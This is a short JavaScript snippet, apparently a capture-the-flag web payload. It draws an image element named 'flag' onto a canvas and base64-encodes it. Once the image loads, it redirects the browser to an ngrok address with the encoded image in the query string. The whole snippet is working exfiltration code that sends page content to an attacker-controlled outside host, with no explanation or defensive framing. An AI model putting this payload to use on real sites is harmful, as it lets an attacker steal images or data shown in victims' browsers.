function getBase64Image(e){
    var a=document.createElement("canvas");
    return a.width=e.width,a.height=e.height,a.getContext("2d").drawImage(e,0,0),a.toDataURL("image/png").replace(/^data:image\/(png|jpg);base64,/,"");
};

flag.onload = () => {
    location='http://d708c4df6f39.ngrok.io?data='+encodeURIComponent(getBase64Image(flag));
}